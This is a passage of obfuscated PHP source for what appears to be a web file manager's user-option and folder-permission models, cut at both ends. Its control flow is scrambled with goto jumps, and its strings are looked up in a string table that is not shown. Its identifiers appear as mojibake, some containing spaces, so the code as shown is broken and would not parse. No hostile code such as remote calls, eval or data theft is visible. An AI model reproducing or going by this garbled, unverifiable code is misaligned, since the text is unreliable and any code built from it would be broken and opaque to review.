public function userSearch($dÕ™èçñáı, $F¡¶ûí†Ê≤ = "\x2a") { return Model($_SERVER[Öíæ€“”≠éÏË][520])->where($dÕ™èçñáı)->field($F¡¶ûí†Ê≤)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\x6f\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($CøÌ•‰Ω≈◊) { $F¡Òé äµÁ =& $_SERVER[Öíæ€“”≠éÏË]; if (!defined($F¡Òé äµÁ[455])) { define($F¡Òé äµÁ[455], 0); } return "\125\163\145\x72\x4f\160\x74\151\157\x6e\137{$CøÌ•‰Ω≈◊}\x5f" . USER_ID; } protected function filterWhere($e‘åú›∂∑¨) { $Fñ«àÛÑü€ =& $_SERVER[Öíæ€“”≠éÏË]; if (!defined($Fñ«àÛÑü€[455])) { define($Fñ«àÛÑü€[455], 0); } $e‘åú›∂∑¨[$Fñ«àÛÑü€[1538]] = USER_ID; return $e‘åú›∂∑¨; } public function cacheRemoveUser($dÊÍû›À¡ÿ, $Fˆ€íÇ»…Ö) { return Cache::remove("\x55\163\x65\162\x4f\x70\x74\x69\x6f\156\x5f{$dÊÍû›À¡ÿ}\x5f" . $Fˆ€íÇ»…Ö); } protected function optionDefault($dÊØ„ÿÍ†À = '') { $bπã∆«°¯Ï =& $_SERVER[Öíæ€“”≠éÏË]; if ($dÊØ„ÿÍ†À == $bπã∆«°¯Ï[33]) { return $GLOBALS[$bπã∆«°¯Ï[6]][$bπã∆«°¯Ï[2182]]; } if ($dÊØ„ÿÍ†À == $bπã∆«°¯Ï[2183]) { return $GLOBALS[$bπã∆«°¯Ï[6]][$bπã∆«°¯Ï[2184]]; } } } goto EüÖóˆÑÆ¯; F«íÍ†óÙ‹: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\x63\x65\x5f\141\x75\164\150"; public function getAuth($DöÑÒ¶é·∑) { goto bœé©ª¨ß‹; Bßπí™Ôò€: $fë«ÀŒ≤á≈ = array(); $dã¿≥Ñ¶∂— = 2 << 25; foreach ($E°éáç≥í≠ as $FÁ£©ﬁäˆÛ) { goto BÍ‹ëçñÈ§; a¬›«ÆöœÂ: $Få‰éÃÖÇœ = 0; if ($FÁ£©ﬁäˆÛ[$CêÖÈı≠Ñ˜[405]] == SourceModel::TYPE_GROUP) { $Få‰éÃÖÇœ = $dã¿≥Ñ¶∂— * 2; } if ($FÁ£©ﬁäˆÛ[$CêÖÈı≠Ñ˜[405]] == SourceModel::TYPE_USER) { $Få‰éÃÖÇœ = $dã¿≥Ñ¶∂—; } goto b√Üà›ÚØ“; BÍ‹ëçñÈ§: $Bõ˘è«óú = Model($CêÖÈı≠Ñ˜[489])->listData($FÁ£©ﬁäˆÛ[$CêÖÈı≠Ñ˜[1807]]); if (!$Bõ˘è«óú) { continue; } $E€åòŸ”·ı[] = $FÁ£©ﬁäˆÛ; goto a¬›«ÆöœÂ; b√Üà›ÚØ“: if ($FÁ£©ﬁäˆÛ[$CêÖÈı≠Ñ˜[405]] == SourceModel::TYPE_USER && $FÁ£©ﬁäˆÛ[$CêÖÈı≠Ñ˜[485]] == $CêÖÈı≠Ñ˜[191]) { $Få‰éÃÖÇœ = 0; } $fë«ÀŒ≤á≈[] = $Bõ˘è«óú[$CêÖÈı≠Ñ˜[407]] + $Få‰éÃÖÇœ; goto C⁄ƒ∫÷ç‚; C⁄ƒ∫÷ç‚: } goto f≥ª⁄∏∆¢ã; f≥ª⁄∏∆¢ã: array_multisort($fë«ÀŒ≤á≈, SORT_DESC, $E€åòŸ”·ı); return $E€åòŸ”·ı; goto CãßãÌ§Â—; bœé©ª¨ß‹: $CêÖÈı≠Ñ˜ =& $_SERVER[Öíæ€“”≠éÏË]; $E°éáç≥í≠ = $this->sourceAuthSelect($DöÑÒ¶é·∑); $E€åòŸ”·ı = array(); goto Bßπí™Ôò€; CãßãÌ§Â—: } public function sourceAuthSelect($e„èˆâÍ√è) { goto CÛ‡ùÑΩñå; CÛ‡ùÑΩñå: $B°°ë≤‡Â =& $_SERVER[Öíæ€“”≠éÏË]; static $C◊∆€Òﬂ§ì = array(); $CÙ»¢—Îπ€ = is_array($e„èˆâÍ√è) ? !1 : !0; goto E ¿’´Íı∫; E ¿’´Íı∫: if ($CÙ»¢—Îπ€) { $e„èˆâÍ√è = array($e„èˆâÍ√è); } $A›èåÌê¥õ = array(); foreach ($e„èˆâÍ√è as $E≤Áêòº€º) { if (isset($C◊∆€Òﬂ§ì[$E≤Áêòº€º])) { $A›èåÌê¥õ[$E≤Áêòº€º] = $C◊∆€Òﬂ§ì[$E≤Áêòº€º]; } } goto B¶¿¬ÚåÌÃ; fÕ£µ± ˘Ò: $dÌøú–ãäÜ = $this->field($E‡Ï∆ºı‘û)->order($B°°ë≤‡Â[394])->where($B‚¡¿Ÿ¡ÁÙ)->select(); $Dé’‰…«≤ô = array_to_keyvalue_group($dÌøú–ãäÜ, $B°°ë≤‡Â[396]); foreach ($e„èˆâÍ√è as $E≤Áêòº€º) { $C◊∆€Òﬂ§ì[$E≤Áêòº€º] = $Dé’‰…«≤ô[$E≤Áêòº€º] ? $Dé’‰…«≤ô[$E≤Áêòº€º] : array(); } goto EÑë≈†éì; B¶¿¬ÚåÌÃ: if (count($A›èåÌê¥õ) == count($e„èˆâÍ√è)) { return $CÙ»¢—Îπ€ ? $A›èåÌê¥õ[$e„èˆâÍ√è[0]] : $A›èåÌê¥õ; } $E‡Ï∆ºı‘û = $B°°ë≤‡Â[1879]; $B‚¡¿Ÿ¡ÁÙ = array($B°°ë≤‡Â[396] => array($B°°ë≤‡Â[7], $e„èˆâÍ√è)); goto fÕ£µ± ˘Ò; EÑë≈†éì: if ($CÙ»¢—Îπ€) { return $dÌøú–ãäÜ; } return $Dé’‰…«≤ô; goto eÿ…ä∑ú⁄Ÿ; eÿ…ä∑ú⁄Ÿ: } public function setAuth($aåâ˘øûôÑ, $DÓåºàı‘â) { goto C†√ƒ†∫Ÿø; a°˘ÜÜ±ò‹: if ($B»‰ÚÚ‘‹‹ != $Aë“‹ºøÔ”) { $eÏâ±ØÁˆù = array($C”¡ıßœ§„[1707] => $B»‰ÚÚ‘‹‹); $C¶§∑ìû¨Â = Model($C”¡ıßœ§„[1793])->field($C”¡ıßœ§„[1538])->where($eÏâ±ØÁˆù)->select(); $C¶§∑ìû¨Â = array_to_keyvalue($C¶§∑ìû¨Â, $C”¡ıßœ§„[33], $C”¡ıßœ§„[1538]); } $f¬ﬁîÎÉ’á = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Aä∏âáÜª = array(); goto e≤ç´ø£é‡; dÉﬁπ«ŸäÓ: return !0; goto aß´ïËìã∫; e≤ç´ø£é‡: foreach ($DÓåºàı‘â as $EÌÑäﬁ†âç) { if (!in_array($EÌÑäﬁ†âç[$C”¡ıßœ§„[405]], $f¬ﬁîÎÉ’á)) { show_json(LNG($C”¡ıßœ§„[1880]), !1); } if ($B»‰ÚÚ‘‹‹ != $Aë“‹ºøÔ”) { if ($EÌÑäﬁ†âç[$C”¡ıßœ§„[405]] == SourceModel::TYPE_GROUP) { } if ($EÌÑäﬁ†âç[$C”¡ıßœ§„[485]] != 0 && !in_array($EÌÑäﬁ†âç[$C”¡ıßœ§„[485]], $C¶§∑ìû¨Â)) { } } if ($EÌÑäﬁ†âç[$C”¡ıßœ§„[485]] == 0) { $EÌÑäﬁ†âç[$C”¡ıßœ§„[405]] = SourceModel::TYPE_USER; } $Aä∏âáÜª[] = array($C”¡ıßœ§„[396] => $aåâ˘øûôÑ, $C”¡ıßœ§„[405] => intval($EÌÑäﬁ†âç[$C”¡ıßœ§„[405]]), $C”¡ıßœ§„[485] => intval($EÌÑäﬁ†âç[$C”¡ıßœ§„[485]]), $C”¡ıßœ§„[1807] => intval($EÌÑäﬁ†âç[$C”¡ıßœ§„[1807]]) ? intval($EÌÑäﬁ†âç[$C”¡ıßœ§„[1807]]) : 0, $C”¡ıßœ§„[1861] => intval($EÌÑäﬁ†âç[$C”¡ıßœ§„[1861]]) ? intval($EÌÑäﬁ†âç[$C”¡ıßœ§„[1861]]) : -1); } $this->where(array($C”¡ıßœ§„[411] => $aåâ˘øûôÑ))->delete(); $this->addAll($Aä∏âáÜª); goto dÉﬁπ«ŸäÓ; C™Û¡îÈãâ: if ($Aè™ó‘Ùà‘[$C”¡ıßœ§„[405]] != SourceModel::TYPE_GROUP) { return !1; } $Aë“‹ºøÔ” = 1; $B»‰ÚÚ‘‹‹ = $Aè™ó‘Ùà‘[$C”¡ıßœ§„[485]]; goto a°˘ÜÜ±ò‹; C†√ƒ†∫Ÿø: $C”¡ıßœ§„ =& $_SERVER[Öíæ€“”≠éÏË]; $Aè™ó‘Ùà‘ = Model($C”¡ıßœ§„[1215])->sourceInfo($aåâ˘øûôÑ); if (!$Aè™ó‘Ùà‘) { return !1; } goto C™Û¡îÈãâ; aß´ïËìã∫: } public function authClear($FÔç˜∂è≈Ì) { $EÑﬁ≥œÉÁå =& $_SERVER[Öíæ€“”≠éÏË]; $b√⁄µıõ√º = Model($EÑﬁ≥œÉÁå[1215])->sourceInfo($FÔç˜∂è≈Ì); $B∑ΩçÈ√ùÿ = array($FÔç˜∂è≈Ì); if ($b√⁄µıõ√º[$EÑﬁ≥œÉÁå[404]] == $EÑﬁ≥œÉÁå[87]) { $A†ÕÎäñéı = array($EÑﬁ≥œÉÁå[567] => array($EÑﬁ≥œÉÁå[526], $b√⁄µıõ√º[$EÑﬁ≥œÉÁå[503]] . $FÔç˜∂è≈Ì . $EÑﬁ≥œÉÁå[527])); $B∑ΩçÈ√ùÿ = Model($EÑﬁ≥œÉÁå[1215])->field($EÑﬁ≥œÉÁå[411])->where($A†ÕÎäñéı)->getField($EÑﬁ≥œÉÁå[396], !0); $B∑ΩçÈ√ùÿ[] = $FÔç˜∂è≈Ì; } $this->where(array($EÑﬁ≥œÉÁå[411] => array($EÑﬁ≥œÉÁå[412], $B∑ΩçÈ√ùÿ)))->delete(); return !0; } public function getAllChildren($aªÒáûõÉø) { goto D™èø”™®∑; f≈ÃúΩÒ©à: if ($DÒ†çäõ™ß[$f∞Æ∞ä◊ã∫[479]] == $f∞Æ∞ä◊ã∫[191] && $DÒ†çäõ™ß[$f∞Æ∞ä◊ã∫[485]] != $cÿÀñ∆ú≤Ç) { $F∫Óêõ∏àò = $this->groupChidldAllRootSource($DÒ†çäõ™ß[$f∞Æ∞ä◊ã∫[485]]); } $e©ï€‹∞ç¥ = $this->field($f∞Æ∞ä◊ã∫[396])->group($f∞Æ∞ä◊ã∫[396])->select(); $e©ï€‹∞ç¥ = array_to_keyvalue($e©ï€‹∞ç¥, $f∞Æ∞ä◊ã∫[33], $f∞Æ∞ä◊ã∫[396]); goto b∫Ú ´ﬂ—ı; D™èø”™®∑: $f∞Æ∞ä◊ã∫ =& $_SERVER[Öíæ€“”≠éÏË]; $DÒ†çäõ™ß = Model($f∞Æ∞ä◊ã∫[1215])->sourceInfo($aªÒáûõÉø); if ($DÒ†çäõ™ß[$f∞Æ∞ä◊ã∫[404]] != $f∞Æ∞ä◊ã∫[87]) { return $this->sourceListAuth(array($aªÒáûõÉø)); } goto AÌÊ—Ω»∫ˆ; AÌÊ—Ω»∫ˆ: if ($DÒ†çäõ™ß[$f∞Æ∞ä◊ã∫[405]] != SourceModel::TYPE_GROUP) { return array(); } $cÿÀñ∆ú≤Ç = 1; $F∫Óêõ∏àò = array($aªÒáûõÉø); goto f≈ÃúΩÒ©à; b∫Ú ´ﬂ—ı: if (!$e©ï€‹∞ç¥) { return array(); } $c∂÷áÓäÇ≠ = $f∞Æ∞ä◊ã∫[1881]; $F≈åË–‹ñä = array($f∞Æ∞ä◊ã∫[396] => array($f∞Æ∞ä◊ã∫[7], $e©ï€‹∞ç¥), $f∞Æ∞ä◊ã∫[424] => $f∞Æ∞ä◊ã∫[191]); goto E¥ùãàãèÓ; aƒÜÏï¬Çƒ: return $this->sourceListAuth($e¢§‚∑Í”ö); goto féìÓÔà‹Ñ; E¥ùãàãèÓ: $fëè⁄ö◊ÈÜ = Model($f∞Æ∞ä◊ã∫[803])->field($c∂÷áÓäÇ≠)->where($F≈åË–‹ñä)->select(); $e¢§‚∑Í”ö = array($aªÒáûõÉø); foreach ($fëè⁄ö◊ÈÜ as $bë∏ÙˆÔ´Û) { foreach ($F∫Óêõ∏àò as $FëÔèË≠†µ) { $a®ÇÓ∆ª∂· = $f∞Æ∞ä◊ã∫[47] . $FëÔèË≠†µ . $f∞Æ∞ä◊ã∫[47]; $FÑâƒªöŸ« = $bë∏ÙˆÔ´Û[$f∞Æ∞ä◊ã∫[503]] . $bë∏ÙˆÔ´Û[$f∞Æ∞ä◊ã∫[396]] . $f∞Æ∞ä◊ã∫[47]; if (strstr($FÑâƒªöŸ«, $a®ÇÓ∆ª∂·)) { $e¢§‚∑Í”ö[] = $bë∏ÙˆÔ´Û[$f∞Æ∞ä◊ã∫[396]]; break; } } } goto aƒÜÏï¬Çƒ; féìÓÔà‹Ñ: } private function sourceListAuth($d§Áÿ¡Éùæ) { goto A‰‚Âù ˆÁ; Eä‹ºâ´⁄õ: $FµÜ‚Ã∆πè = array(); $f±ûı—èıò = array(); foreach ($FÑØ‹ôÊ´ as $Aéñ©ø≈ë¯) { goto Dé∏±Ïˆ“«; aÙ⁄‚Û≥∆·: $Aéñ©ø≈ë¯[$c˘Çîåâπô[1882]] = $this->authTargetInfo($FÆÓËî¡Ò¥); $Aéñ©ø≈ë¯[$c˘Çîåâπô[501]] = rtrim($Aéñ©ø≈ë¯[$c˘Çîåâπô[507]], $c˘Çîåâπô[8]) . $c˘Çîåâπô[8] . ltrim($Aéñ©ø≈ë¯[$c˘Çîåâπô[501]], $c˘Çîåâπô[8]); $FµÜ‚Ã∆πè[] = $Aéñ©ø≈ë¯; goto aÚœ·ÏØ…ç; aÚœ·ÏØ…ç: $bç£áÑ€’… = count(explode($c˘Çîåâπô[8], trim($Aéñ©ø≈ë¯[$c˘Çîåâπô[501]], $c˘Çîåâπô[8]))); $f±ûı—èıò[] = $bç£áÑ€’… + ($Aéñ©ø≈ë¯[$c˘Çîåâπô[29]] == $c˘Çîåâπô[77] ? 0 : 1000); goto d«°˜©≥í™; Aî∞ôÃëä•: unset($Aéñ©ø≈ë¯[$c˘Çîåâπô[85]]); $FÆÓËî¡Ò¥ = $eùæè£ ∂ê[$Aéñ©ø≈ë¯[$c˘Çîåâπô[396]]]; if (!$FÆÓËî¡Ò¥) { continue; } goto aÙ⁄‚Û≥∆·; Dé∏±Ïˆ“«: unset($Aéñ©ø≈ë¯[$c˘Çîåâπô[435]]); unset($Aéñ©ø≈ë¯[$c˘Çîåâπô[433]]); unset($Aéñ©ø≈ë¯[$c˘Çîåâπô[407]]); goto Aî∞ôÃëä•; d«°˜©≥í™: } goto BöÖû∆†π‚; A‰‚Âù ˆÁ: $c˘Çîåâπô =& $_SERVER[Öíæ€“”≠éÏË]; $FÑØ‹ôÊ´ = Model($c˘Çîåâπô[1215])->sourceListInfo($d§Áÿ¡Éùæ, !0); $eùæè£ ∂ê = $this->sourceAuthSelect($d§Áÿ¡Éùæ); goto Eä‹ºâ´⁄õ; BöÖû∆†π‚: array_multisort($f±ûı—èıò, SORT_ASC, $FµÜ‚Ã∆πè); return $FµÜ‚Ã∆πè; goto b’è¬µÊ´ñ; b’è¬µÊ´ñ: } private function groupChidldAllRootSource($DÔ◊™•œ»è) { $FË≠÷ôèñª =& $_SERVER[Öíæ€“”≠éÏË]; $fœ¨≥øè†π = Model($FË≠÷ôèñª[1883])->groupChildrenAll($DÔ◊™•œ»è); $D»·É±≤µº = array($FË≠÷ôèñª[479] => 0, $FË≠÷ôèñª[485] => array($FË≠÷ôèñª[7], $fœ¨≥øè†π), $FË≠÷ôèñª[405] => SourceModel::TYPE_GROUP); $aüÃ»ËÓÉƒ = Model($FË≠÷ôèñª[803])->field($FË≠÷ôèñª[396])->where($D»·É±≤µº)->select(); $aüÃ»ËÓÉƒ = array_to_keyvalue($aüÃ»ËÓÉƒ, $FË≠÷ôèñª[33], $FË≠÷ôèñª[396]); return $aüÃ»ËÓÉƒ; } private function authTargetInfo($d≠Æ§©·ƒä) { goto eöÙâö˘’Ü; F°˜…Ê‰”Ω: return $fÖπë‘⁄Üê; goto CÈ»‘≤ä¡π; eöÙâö˘’Ü: $dÇ™¢ºﬁ≈â =& $_SERVER[Öíæ€“”≠éÏË]; $fÖπë‘⁄Üê = array(); $fﬂèË∂◊Ï÷ = array(); goto AõÆä∆Â‡±; AõÆä∆Â‡±: $E±«÷ÏÔàª = 2 << 25; foreach ($d≠Æ§©·ƒä as $CÏ¥«π£‡ù) { goto A§åŒ†◊…‹; A§åŒ†◊…‹: $aßÈ‚Á“ß› = Model($dÇ™¢ºﬁ≈â[489])->listData($CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[1807]]); if (!$aßÈ‚Á“ß›) { continue; } if ($CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[405]] == SourceModel::TYPE_USER) { $D√ê¿ ∆êÕ = Model($dÇ™¢ºﬁ≈â[495])->getInfoSimpleOuter($CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[485]]); if ($D√ê¿ ∆êÕ[$dÇ™¢ºﬁ≈â[1538]] == $dÇ™¢ºﬁ≈â[1094]) { continue; } if ($D√ê¿ ∆êÕ[$dÇ™¢ºﬁ≈â[1538]] == $dÇ™¢ºﬁ≈â[191]) { $D√ê¿ ∆êÕ[$dÇ™¢ºﬁ≈â[28]] = LNG($dÇ™¢ºﬁ≈â[1884]); } } else { $D√ê¿ ∆êÕ = Model($dÇ™¢ºﬁ≈â[504])->getInfoSimple($CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[485]]); } goto bâëƒ‹›Œ⁄; EØîÿÕÓ¶…: $Fæà¡ë·¥ = 0; if ($CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[405]] == SourceModel::TYPE_GROUP) { $Fæà¡ë·¥ = $E±«÷ÏÔàª * 2; } if ($CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[405]] == SourceModel::TYPE_USER) { $Fæà¡ë·¥ = $E±«÷ÏÔàª; } goto EÆïº€¯úõ; bâëƒ‹›Œ⁄: if (!$D√ê¿ ∆êÕ) { continue; } $D√ê¿ ∆êÕ[$dÇ™¢ºﬁ≈â[447]] = $aßÈ‚Á“ß›; $fÖπë‘⁄Üê[] = $D√ê¿ ∆êÕ; goto EØîÿÕÓ¶…; EÆïº€¯úõ: if ($CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[405]] == SourceModel::TYPE_USER && $CÏ¥«π£‡ù[$dÇ™¢ºﬁ≈â[485]] == $dÇ™¢ºﬁ≈â[191]) { $Fæà¡ë·¥ = 0; } $fﬂèË∂◊Ï÷[] = $aßÈ‚Á“ß›[$dÇ™¢ºﬁ≈â[407]] + $Fæà¡ë·¥; goto d“ö∆äèúá; d“ö∆äèúá: } array_multisort($fﬂèË∂◊Ï÷, SORT_DESC, $fÖπë‘⁄Üê); goto F°˜…Ê‰”Ω; CÈ»‘≤ä¡π: } public function getAllChildrenByUser($F‹ùå£ÖÂí, $Cë√¿Á„ª€) { goto fÑú∫µùæº; A≈îóüÇ•Ÿ: if ($cÿºô‚€ëÏ[$e¢π√ı∂æÇ[479]] == $e¢π√ı∂æÇ[191] && $cÿºô‚€ëÏ[$e¢π√ı∂æÇ[485]] != $C—¢ŒË¯È¥ && $this->groupContainUser($cÿºô‚€ëÏ[$e¢π√ı∂æÇ[485]], $Cë√¿Á„ª€)) { foreach ($E¡”∞äÌ ´[$e¢π√ı∂æÇ[1885]] as $f˜ñ≈°“§≥) { $DÜÈ¿»∞€◊ = Model($e¢π√ı∂æÇ[504])->getInfo($f˜ñ≈°“§≥[$e¢π√ı∂æÇ[1707]]); $C≤ö∞Í∆¯¬ = Model($e¢π√ı∂æÇ[520])->getInfoSimpleOuter($Cë√¿Á„ª€); $C≤ö∞Í∆¯¬[$e¢π√ı∂æÇ[447]] = $f˜ñ≈°“§≥[$e¢π√ı∂æÇ[407]]; if (Model($e¢π√ı∂æÇ[489])->authCheckAction($f˜ñ≈°“§≥[$e¢π√ı∂æÇ[407]][$e¢π√ı∂æÇ[407]], $e¢π√ı∂æÇ[1727])) { continue; } $F†◊—„ÒŒç = array($e¢π√ı∂æÇ[28] => $e¢π√ı∂æÇ[1490] . $DÜÈ¿»∞€◊[$e¢π√ı∂æÇ[28]], $e¢π√ı∂æÇ[396] => $DÜÈ¿»∞€◊[$e¢π√ı∂æÇ[85]][$e¢π√ı∂æÇ[396]], $e¢π√ı∂æÇ[76] => KodIO::make($DÜÈ¿»∞€◊[$e¢π√ı∂æÇ[85]][$e¢π√ı∂æÇ[396]]), $e¢π√ı∂æÇ[479] => $e¢π√ı∂æÇ[191], $e¢π√ı∂æÇ[405] => $e¢π√ı∂æÇ[497], $e¢π√ı∂æÇ[29] => $e¢π√ı∂æÇ[531], $e¢π√ı∂æÇ[501] => $DÜÈ¿»∞€◊[$e¢π√ı∂æÇ[508]], $e¢π√ı∂æÇ[1707] => $DÜÈ¿»∞€◊[$e¢π√ı∂æÇ[1707]], $e¢π√ı∂æÇ[505] => $DÜÈ¿»∞€◊[$e¢π√ı∂æÇ[479]], $e¢π√ı∂æÇ[1882] => array($C≤ö∞Í∆¯¬)); $D∑ï≠ã¡Éø[$F†◊—„ÒŒç[$e¢π√ı∂æÇ[396]]] = $F†◊—„ÒŒç; } } $eÆ≤ù»ê¢» = array(); $D∫Ûˆèúπ– = $this->getAllChildren($F‹ùå£ÖÂí); goto B∂£“Ç∫ﬁ›; B∂£“Ç∫ﬁ›: foreach ($D∫Ûˆèúπ– as $E®˜ïüå∑º) { $f™™ß …ûµ = !1; foreach ($E®˜ïüå∑º[$e¢π√ı∂æÇ[1882]] as $A£œ˘óßò¨) { if ($A£œ˘óßò¨[$e¢π√ı∂æÇ[1538]]) { if ($A£œ˘óßò¨[$e¢π√ı∂æÇ[1538]] == $Cë√¿Á„ª€) { $f™™ß …ûµ = !0; break; } } if ($A£œ˘óßò¨[$e¢π√ı∂æÇ[1707]]) { if ($this->groupContainUser($A£œ˘óßò¨[$e¢π√ı∂æÇ[1707]], $Cë√¿Á„ª€)) { $f™™ß …ûµ = !0; break; } } } if ($f™™ß …ûµ) { $eÆ≤ù»ê¢»[] = $E®˜ïüå∑º; } $CÜ∞ÈÀñ∆ñ = $E®˜ïüå∑º[$e¢π√ı∂æÇ[396]]; if (isset($D∑ï≠ã¡Éø[$CÜ∞ÈÀñ∆ñ])) { $E®˜ïüå∑º[$e¢π√ı∂æÇ[1882]][] = $D∑ï≠ã¡Éø[$CÜ∞ÈÀñ∆ñ][0]; $D∑ï≠ã¡Éø[$CÜ∞ÈÀñ∆ñ] = !1; } } $D∑ï≠ã¡Éø = array_filter(array_values($D∑ï≠ã¡Éø)); $eÆ≤ù»ê¢» = array_merge($D∑ï≠ã¡Éø, $eÆ≤ù»ê¢»); goto e» ·Î∫â€; e» ·Î∫â€: return $eÆ≤ù»ê¢»; goto B∆Ã∞…£éÈ; fÑú∫µùæº: $e¢π√ı∂æÇ =& $_SERVER[Öíæ€“”≠éÏË]; $E¡”∞äÌ ´ = Model($e¢π√ı∂æÇ[520])->getInfo($Cë√¿Á„ª€); if (!$Cë√¿Á„ª€ || !$F‹ùå£ÖÂí || !$E¡”∞äÌ ´) { return array(); } goto C˘â˜®ä„Ã; C˘â˜®ä„Ã: $cÿºô‚€ëÏ = Model($e¢π√ı∂æÇ[1215])->sourceInfo($F‹ùå£ÖÂí); $D∑ï≠ã¡Éø = array(); $C—¢ŒË¯È¥ = 1; goto A≈îóüÇ•Ÿ; B∆Ã∞…£éÈ: } public function setAllChildrenByUser($Bõõàº‡ò¯, $FØ‘ˆ€¡∫, $EÎ≥àÕÿ± ) { $f◊åæ¢ÁÆû =& $_SERVER[Öíæ€“”≠éÏË]; $b∆≥ıØ∞•Ì = $this->getAllChildrenByUser($Bõõàº‡ò¯, $FØ‘ˆ€¡∫); if (!$EÎ≥àÕÿ±  || !$b∆≥ıØ∞•Ì) { return !1; } foreach ($b∆≥ıØ∞•Ì as $E›ñÓ‡€Œ‚) { $A◊À–¨èªõ = array(); foreach ($E›ñÓ‡€Œ‚[$f◊åæ¢ÁÆû[1882]] as $E‘Ñ‚òõä) { $FâÖ„≥…Ç¥ = $E‘Ñ‚òõä[$f◊åæ¢ÁÆû[447]]; $BÑø⁄…≠±∆ = $E‘Ñ‚òõä[$f◊åæ¢ÁÆû[1538]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $FöÊ˜ÖÆ≤Ò = $E‘Ñ‚òõä[$f◊åæ¢ÁÆû[1538]] ? $E‘Ñ‚òõä[$f◊åæ¢ÁÆû[1538]] : $E‘Ñ‚òõä[$f◊åæ¢ÁÆû[1707]]; if ($E‘Ñ‚òõä[$f◊åæ¢ÁÆû[1538]] && $E‘Ñ‚òõä[$f◊åæ¢ÁÆû[1538]] == $FØ‘ˆ€¡∫) { continue; } $A◊À–¨èªõ[] = array($f◊åæ¢ÁÆû[396] => $E›ñÓ‡€Œ‚[$f◊åæ¢ÁÆû[396]], $f◊åæ¢ÁÆû[405] => $BÑø⁄…≠±∆, $f◊åæ¢ÁÆû[485] => intval($FöÊ˜ÖÆ≤Ò), $f◊åæ¢ÁÆû[1807] => isset($FâÖ„≥…Ç¥[$f◊åæ¢ÁÆû[394]]) ? intval($FâÖ„≥…Ç¥[$f◊åæ¢ÁÆû[394]]) : 0, $f◊åæ¢ÁÆû[1861] => isset($FâÖ„≥…Ç¥[$f◊åæ¢ÁÆû[1861]]) ? intval($FâÖ„≥…Ç¥[$f◊åæ¢ÁÆû[1861]]) : -1); } $A◊À–¨èªõ[] = array($f◊åæ¢ÁÆû[396] => $E›ñÓ‡€Œ‚[$f◊åæ¢ÁÆû[396]], $f◊åæ¢ÁÆû[405] => SourceModel::TYPE_USER, $f◊åæ¢ÁÆû[485] => intval($FØ‘ˆ€¡∫), $f◊åæ¢ÁÆû[1807] => intval($EÎ≥àÕÿ± ), $f◊åæ¢ÁÆû[1861] => -1); $this->where(array($f◊åæ¢ÁÆû[411] => $E›ñÓ‡€Œ‚[$f◊åæ¢ÁÆû[396]]))->delete(); $this->addAll($A◊À–¨èªõ); } return !0; } public function get($A’úÓ•ëò¥) { $EË›û°éß = $this->getSourceList(array($A’úÓ•ëò¥), !0); return $EË›û°éß[0]; } public function getSourceList($E«ë´ªéÇ∞, $dÖéïﬂà® = false, $A¿í¥åóÕﬂ = false) { goto Fç ñ∫ÿîê; c⁄±“òÛà’: $c©û›–ëﬂ¡ = array(); foreach ($dÖéïﬂà® as $Fµ‘Çï£Ãê => $fµ¡•Óç•Í) { if ($c≈ß≠«≥√ö) { $c©û›–ëﬂ¡[$Fµ‘Çï£Ãê] = $A… ¡ÔìËÒ; continue; } $c©û›–ëﬂ¡[$Fµ‘Çï£Ãê] = $this->makeSourceAuth($fµ¡•Óç•Í, $càôØ©¨⁄Ò, $A¿í¥åóÕﬂ); } return $c©û›–ëﬂ¡; goto BÂéñﬂ–ﬁ†; Fç ñ∫ÿîê: $a¬éà„ÆÕë =& $_SERVER[Öíæ€“”≠éÏË]; if (!$E«ë´ªéÇ∞) { return array(); } $FπÒÆﬁÛŸà = Model($a¬éà„ÆÕë[1215]); goto aƒıÖéŒ±à; B◊ÈÃ÷«¯Ö: $c≈ß≠«≥√ö = $this->userIsRoot($A¿í¥åóÕﬂ); $F˘∑Öπ™‚¿ = AuthModel::authAll(); $A… ¡ÔìËÒ = array($a¬éà„ÆÕë[408] => $F˘∑Öπ™‚¿, $a¬éà„ÆÕë[1887] => array($a¬éà„ÆÕë[413] => 0, $a¬éà„ÆÕë[1713] => $F˘∑Öπ™‚¿, $a¬éà„ÆÕë[414] => LNG($a¬éà„ÆÕë[1888]), $a¬éà„ÆÕë[1729] => $a¬éà„ÆÕë[1889])); goto c⁄±“òÛà’; aƒıÖéŒ±à: if (!$dÖéïﬂà® && count($E«ë´ªéÇ∞) == 1) { $dÖéïﬂà® = array(); $dÖéïﬂà®[$E«ë´ªéÇ∞[0]] = $FπÒÆﬁÛŸà->sourceInfo($E«ë´ªéÇ∞[0]); } if (!$dÖéïﬂà®) { $c®Ù‰ÌÃÌ¬ = array($a¬éà„ÆÕë[411] => array($a¬éà„ÆÕë[412], $E«ë´ªéÇ∞)); $dÖéïﬂà® = $FπÒÆﬁÛŸà->field($a¬éà„ÆÕë[1886])->where($c®Ù‰ÌÃÌ¬)->select(); $dÖéïﬂà® = array_to_keyvalue($dÖéïﬂà®, $a¬éà„ÆÕë[396]); } $aÕøÏ·‚õá = $E«ë´ªéÇ∞; goto b√èÆ•‚ﬂ„; b√èÆ•‚ﬂ„: foreach ($dÖéïﬂà® as $fƒÿ÷»–¡œ => $d®©¡´á¢Î) { $fÖèœ≥à⁄ë = $FπÒÆﬁÛŸà->parentLevelArray($d®©¡´á¢Î[$a¬éà„ÆÕë[503]]); $aÕøÏ·‚õá = array_merge($aÕøÏ·‚õá, array($fƒÿ÷»–¡œ), array_reverse($fÖèœ≥à⁄ë)); } $aÕøÏ·‚õá = array_values(array_unique($aÕøÏ·‚õá)); if (!$aÕøÏ·‚õá) { return array(); } goto e¯êê‰≠°ø; e¯êê‰≠°ø: $Aû∑∆ò®Ÿ = $this->sourceAuthSelect($aÕøÏ·‚õá); $càôØ©¨⁄Ò = array(); foreach ($aÕøÏ·‚õá as $Fµ‘Çï£Ãê) { if (isset($Aû∑∆ò®Ÿ[$Fµ‘Çï£Ãê])) 